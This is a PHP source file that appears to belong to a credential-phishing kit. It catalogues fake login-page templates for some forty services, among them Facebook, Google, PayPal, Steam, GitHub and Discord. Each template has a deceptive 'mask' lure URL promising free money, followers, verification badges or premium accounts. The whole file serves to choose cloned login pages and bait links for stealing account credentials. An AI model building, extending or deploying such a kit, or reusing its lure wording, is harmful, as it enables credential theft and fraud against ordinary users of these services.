<?php
declare(strict_types=1);

final class TemplateCatalog
{
    /** @return list<array<string, mixed>> */
    public static function all(): array
    {
        return [
            self::group('Facebook', 'fab fa-facebook', [
                ['id' => 'facebook', 'label' => 'Traditional Login Page', 'mask' => 'https://blue-verified-badge-for-facebook-free'],
                ['id' => 'fb_advanced', 'label' => 'Advanced Voting Poll Login Page', 'mask' => 'https://vote-for-the-best-social-media'],
                ['id' => 'fb_security', 'label' => 'Fake Security Login Page', 'mask' => 'https://make-your-facebook-secured-and-free-from-hackers'],
                ['id' => 'fb_messenger', 'label' => 'Facebook Messenger Login Page', 'mask' => 'https://get-messenger-premium-features-free'],
            ]),
            self::group('Instagram', 'fab fa-instagram', [
                ['id' => 'instagram', 'label' => 'Traditional Login Page', 'mask' => 'https://get-unlimited-followers-for-instagram'],
                ['id' => 'ig_followers', 'label' => 'Auto Followers Login Page', 'mask' => 'https://get-unlimited-followers-for-instagram'],
                ['id' => 'insta_followers', 'label' => '1000 Followers Login Page', 'mask' => 'https://get-1000-followers-for-instagram'],
                ['id' => 'ig_verify', 'label' => 'Blue Badge Verify Login Page', 'mask' => 'https://blue-badge-verify-for-instagram-free'],
            ]),
            self::group('Google', 'fab fa-google', [
                ['id' => 'google', 'label' => 'Gmail Old Login Page', 'mask' => 'https://get-unlimited-google-drive-free'],
                ['id' => 'google_new', 'label' => 'Gmail New Login Page', 'mask' => 'https://get-unlimited-google-drive-free'],
                ['id' => 'google_poll', 'label' => 'Advanced Voting Poll', 'mask' => 'https://vote-for-the-best-social-media'],
            ]),
            self::group('VK', 'fab fa-vk', [
                ['id' => 'vk', 'label' => 'Traditional Login Page', 'mask' => 'https://vk-premium-real-method-2020'],
                ['id' => 'vk_poll', 'label' => 'Advanced Voting Poll Login Page', 'mask' => 'https://vote-for-the-best-social-media'],
            ]),
            self::flat('Microsoft', 'microsoft', 'fab fa-microsoft', 'https://unlimited-onedrive-space-for-free'),
            self::flat('Netflix', 'netflix', 'fas fa-film', 'https://upgrade-your-netflix-plan-free'),
            self::flat('PayPal', 'paypal', 'fab fa-paypal', 'https://get-500-usd-free-to-your-acount'),
            self::flat('Steam', 'steam', 'fab fa-steam', 'https://steam-500-usd-gift-card-free'),
            self::flat('Twitter', 'twitter', 'fab fa-twitter', 'https://get-blue-badge-on-twitter-free'),
            self::flat('PlayStation', 'playstation', 'fab fa-playstation', 'https://playstation-500-usd-gift-card-free'),
            self::flat('TikTok', 'tiktok', 'fab fa-tiktok', 'https://tiktok-free-liker'),
            self::flat('Twitch', 'twitch', 'fab fa-twitch', 'https://unlimited-twitch-tv-user-for-free'),
            self::flat('Pinterest', 'pinterest', 'fab fa-pinterest', 'https://get-a-premium-plan-for-pinterest-free'),
            self::flat('Snapchat', 'snapchat', 'fab fa-snapchat', 'https://view-locked-snapchat-accounts-secretly'),
            self::flat('LinkedIn', 'linkedin', 'fab fa-linkedin', 'https://get-a-premium-plan-for-linkedin-free'),
            self::flat('eBay', 'ebay', 'fab fa-ebay', 'https://get-500-usd-free-to-your-acount'),
            self::flat('Quora', 'quora', 'fab fa-quora', 'https://quora-premium-for-free'),
            self::flat('Protonmail', 'protonmail', 'fas fa-envelope', 'https://protonmail-pro-basics-for-free'),
            self::flat('Spotify', 'spotify', 'fab fa-spotify', 'https://convert-your-account-to-spotify-premium'),
            self::flat('Reddit', 'reddit', 'fab fa-reddit', 'https://reddit-official-verified-member-badge'),
            self::flat('Adobe', 'adobe', 'fab fa-adobe', 'https://get-adobe-lifetime-pro-membership-free'),
            self::flat('DeviantArt', 'deviantart', 'fab fa-deviantart', 'https://get-500-usd-free-to-your-acount'),
            self::flat('Badoo', 'badoo', 'fas fa-heart', 'https://get-500-usd-free-to-your-acount'),
            self::flat('Origin', 'origin', 'fab fa-origin', 'https://get-500-usd-free-to-your-acount'),
            self::flat('Dropbox', 'dropbox', 'fab fa-dropbox', 'https://get-1TB-cloud-storage-free'),
            self::flat('Yahoo', 'yahoo', 'fab fa-yahoo', 'https://grab-mail-from-anyother-yahoo-account-free'),
            self::flat('WordPress', 'wordpress', 'fab fa-wordpress', 'https://unlimited-wordpress-traffic-free'),
            self::flat('Yandex', 'yandex', 'fab fa-yandex', 'https://grab-mail-from-anyother-yandex-account-free'),
            self::flat('Stack Overflow', 'stackoverflow', 'fab fa-stack-overflow', 'https://get-stackoverflow-lifetime-pro-membership-free'),
            self::flat('Xbox', 'xbox', 'fab fa-xbox', 'https://get-500-usd-free-to-your-acount'),
            self::flat('Mediafire', 'mediafire', 'fas fa-fire', 'https://get-1TB-on-mediafire-free'),
            self::flat('GitLab', 'gitlab', 'fab fa-gitlab', 'https://get-1k-followers-on-gitlab-free'),
            self::flat('GitHub', 'github', 'fab fa-github', 'https://get-1k-followers-on-github-free'),
            self::flat('Discord', 'discord', 'fab fa-discord', 'https://get-discord-nitro-free'),
            self::flat('Roblox', 'roblox', 'fas fa-gamepad', 'https://get-free-robux'),
        ];
    }

    public static function find(string $templateId): ?array
    {
        foreach (self::all() as $group) {
            foreach ($group['templates'] as $tpl) {
                if ($tpl['id'] === $templateId) {
                    return $tpl + ['group' => $group['name']];
                }
            }
        }
        return null;
    }

    /** @param list<array<string, string>> $templates */
    private static function group(string $name, string $icon, array $templates): array
    {
        return ['name' => $name, 'icon' => $icon, 'templates' => $templates];
    }

    private static function flat(string $name, string $id, string $icon, string $mask): array
    {
        return self::group($name, $icon, [
            ['id' => $id, 'label' => 'Login Page', 'mask' => $mask],
        ]);
    }
}
